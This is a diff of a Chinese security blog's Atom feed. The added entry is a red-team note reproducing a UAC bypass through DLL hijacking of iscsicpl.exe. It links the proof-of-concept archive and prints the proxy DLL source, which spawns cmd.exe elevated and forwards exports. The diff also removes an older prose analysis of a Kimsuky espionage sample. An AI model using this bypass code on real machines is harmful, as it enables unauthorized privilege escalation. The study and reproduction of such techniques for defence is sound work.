@@ -6,7 +6,7 @@
   <link href="http://422926799.github.io/atom.xml" rel="self"/>
   
   <link href="http://422926799.github.io/"/>
-  <updated>2022-05-31T18:16:00.263Z</updated>
+  <updated>2022-07-15T19:23:56.318Z</updated>
   <id>http://422926799.github.io/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>iscsicpl.exe ByPassUac复现</title>
+    <link href="http://422926799.github.io/posts/c08eee8b.html"/>
+    <id>http://422926799.github.io/posts/c08eee8b.html</id>
+    <published>2022-07-15T19:05:19.000Z</published>
+    <updated>2022-07-15T19:23:56.318Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上午在推特逛街，看到了个这个bypassuac。复现了一下，写个笔记</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>lnk:<a href="https://www.ddosi.org/iscsicpl-bypassuac/" target="_blank" rel="noopener">https://www.ddosi.org/iscsicpl-bypassuac/</a><br>poc:<a href="https://github.com/hackerhouse-opensource/iscsicpl_bypassUAC/archive/refs/heads/main.zip" target="_blank" rel="noopener">https://github.com/hackerhouse-opensource/iscsicpl_bypassUAC/archive/refs/heads/main.zip</a><br><img src="https://s1.ax1x.com/2022/07/16/j4DSQ1.png" alt=""></p><p>c:\Windows\syswow64\iscsicpl.exe缺少iscsiexe.dll和iscsiexe_org.dll<br><img src="https://s1.ax1x.com/2022/07/16/j4Dpsx.png" alt=""><br><img src="https://s1.ax1x.com/2022/07/16/j4D9L6.png" alt=""></p><p>sigcheck检测,autoElevate为true。进程权限自提升<br><img src="https://s1.ax1x.com/2022/07/16/j4DFoD.png" alt=""></p><p>翻看代码，作者修改了注册表的HKEY_CURRENT_USER\Environment Path的键值为当前用户的TMP目录。看了一下这个注册表的键值和PATH环境变量最后一个路径对应，修改该注册表相当于直接动环境变量路径最后一个路径<br>HKEY_CURRENT_USER\Environment注册表路径参考链接：<a href="https://baike.baidu.com/item/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/1730949" target="_blank" rel="noopener">https://baike.baidu.com/item/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/1730949</a><br>（当然也可以直接修改windir环境变量，然后dll丢到对应目录）<br><img src="https://s1.ax1x.com/2022/07/16/j4DAFe.png" alt=""><br><img src="https://s1.ax1x.com/2022/07/16/j4DeSA.png" alt=""></p><p>重复说一下DLL加载顺序<br><img src="https://s1.ax1x.com/2022/07/16/j4DmQI.png" alt=""><br>直接加载iscsiexe.dl，会报缺少来自iscsiexe_org.dll的SvchostPushServiceGlobals、ServiceMain、DiscpEstablishServiceLinkage外部导出函数。<br>（一个dll模板，转发就行）<br><img src="https://s1.ax1x.com/2022/07/16/j4Dnyt.png" alt=""><br>github上poc的dll code</p><pre><code>// iscsiexe.cpp, the payload DLL executed by iscsicpl.exe#include &quot;pch.h&quot;#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;tchar.h&gt;#include &quot;resource.h&quot;#pragma pack(1)// LoadString() for linker#pragma comment(lib,&quot;User32.lib&quot;)#define MAX_ENV_SIZE 32767BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID  lpReserved){    static HINSTANCE hL;    LPWSTR pCMD = new WCHAR[MAX_ENV_SIZE];    char pACMD[MAX_ENV_SIZE];    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:              WinExec(&quot;C:\\Windows\\System32\\cmd.exe&quot;, SW_SHOW);        //hL = LoadLibrary(_T(&quot;.\\iscsiexe_org.dll&quot;));              /*        if (!hL)            return false;        // execute the command string from the module resource section        LoadString(GetModuleHandle(L&quot;iscsiexe.dll&quot;), IDS_CMD101, pCMD,  MAX_ENV_SIZE);        WideCharToMultiByte(CP_ACP, 0, pCMD, wcslen(pCMD), pACMD, MAX_ENV_SIZE,  NULL, NULL);        WinExec(pACMD, SW_SHOW);              */        break;    case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        FreeLibrary(hL);        break;    }    return TRUE;}// the proxy DLL mappings for the linker#pragma comment(linker,  &quot;/export:SvchostPushServiceGlobals=iscsiexe_org.SvchostPushServiceGlobals&quot;)#pragma comment(linker, &quot;/export:ServiceMain=iscsiexe_org.ServiceMain&quot;)#pragma comment(linker,  &quot;/export:DiscpEstablishServiceLinkage=iscsiexe_org.DiscpEstablishServiceLinkage&quot;)</code></pre><p><img src="https://s1.ax1x.com/2022/07/16/j4DuOP.png" alt=""></p><p>win7测试<br><img src="https://s1.ax1x.com/2022/07/16/j4DMef.png" alt=""></p><p>win10测试<br><img src="https://s1.ax1x.com/2022/07/16/j4DQw8.png" alt=""></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上午在推特逛街，看到了个这个bypassuac。复现了一下，写个笔记&lt;/p&gt;
+&lt;h2 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class</summary>
+      
+    
+    
+    
+    
+    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
+    
+  </entry>
   
   <entry>
     <title>CVE-2022-30190 样本分析与漏洞复现</title>
@@ -439,28 +462,6 @@
     
     
     <category term="工具刨析" scheme="http://422926799.github.io/tags/工具刨析/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Kimsuky 间谍活动分析</title>
-    <link href="http://422926799.github.io/posts/5c51f955.html"/>
-    <id>http://422926799.github.io/posts/5c51f955.html</id>
-    <published>2021-08-26T17:25:04.000Z</published>
-    <updated>2021-08-26T17:39:05.501Z</updated>
-    
-    <content type="html"><![CDATA[<p>事件背景:韩国外交部文件及其通讯的诱饵<br>样本地址：<a href="https://www.virustotal.com/gui/file/a30afeea0bb774b975c0f80273200272e0bc34e3d93caed70dc7356fc156ffc3/detection" target="_blank" rel="noopener">https://www.virustotal.com/gui/file/a30afeea0bb774b975c0f80273200272e0bc34e3d93caed70dc7356fc156ffc3/detection</a><br><img src="https://z3.ax1x.com/2021/08/27/hKMneI.png" alt=""></p><p>type：Javascript<br>sha256：20eff877aeff0afaa8a5d29fe272bdd61e49779b9e308c4a202ad868a901a5cd<br>size：27.31 MB（28634023 字节）</p><p>一共有两段base64<br>打开是一段js解码base64写入诱饵pdf，第二段base64解码后在利用certutil解码得到UPX加壳的dll<br><img src="https://z3.ax1x.com/2021/08/27/hKMKTP.png" alt=""></p><p>regsvr32调用dll<br><img src="https://z3.ax1x.com/2021/08/27/hKMlY8.png" alt=""></p><p>诱饵PDF如下<br><img src="https://z3.ax1x.com/2021/08/27/hKMGlQ.png" alt=""></p><p>脱了UPX壳后的dll<br>sha256：ae50cf4339ff2f2b3a50cf8e8027b818b18a0582e143e842bf41fdb00e0bfba5<br>type：DLL x64<br>size：474.50 KB（485888 字节）<br><img src="https://z3.ax1x.com/2021/08/27/hKMJyj.png" alt=""></p><p>由于混淆严重，整体分析过程如下：<br><img src="https://z3.ax1x.com/2021/08/27/hKMYOs.png" alt=""></p><p>先反调试检查，遍历所有设备，查看对应设备的目录，然后提取.txt,hwp,.pdf,.doc,.xls,.ppt后缀的文件最后文件上传,键盘输入hook匹配到<br>指定的字符串写入到log.txt最后回传，注册表写入dll所在路径开机自启regsvr32<br><img src="https://z3.ax1x.com/2021/08/27/hKMfk6.png" alt=""></p><p>（反调试检查）<br><img src="https://z3.ax1x.com/2021/08/27/hKMo1e.png" alt=""></p><p>（遍历所有设备）<br><img src="https://z3.ax1x.com/2021/08/27/hKMq0I.png" alt=""></p><p>（获取C盘目录下的文件）<br><img src="https://z3.ax1x.com/2021/08/27/hKMjtf.png" alt=""></p><p>（搜索指定后缀的文件）<br><img src="https://z3.ax1x.com/2021/08/27/hKMvh8.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/08/27/hKQpcQ.png" alt=""></p><p>（键盘输入Hook，输入某些字符串匹配后写入到log.txt）<br><img src="https://z3.ax1x.com/2021/08/27/hKQ9Xj.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/08/27/hKQENV.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/08/27/hKQAA0.png" alt=""></p><p>（文件上传到远端）<br><img src="https://z3.ax1x.com/2021/08/27/hKQe9U.png" alt=""></p><p>参考链接:<a href="https://inquest.net/blog/2021/08/23/kimsuky-espionage-campaign" target="_blank" rel="noopener">https://inquest.net/blog/2021/08/23/kimsuky-espionage-campaign</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;事件背景:韩国外交部文件及其通讯的诱饵&lt;br&gt;样本地址：&lt;a href=&quot;https://www.virustotal.com/gui/file/a30afeea0bb774b975c0f80273200272e0bc34e3d93caed70dc7356fc156ffc3</summary>
-      
-    
-    
-    
-    
-    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
     
   </entry>
   
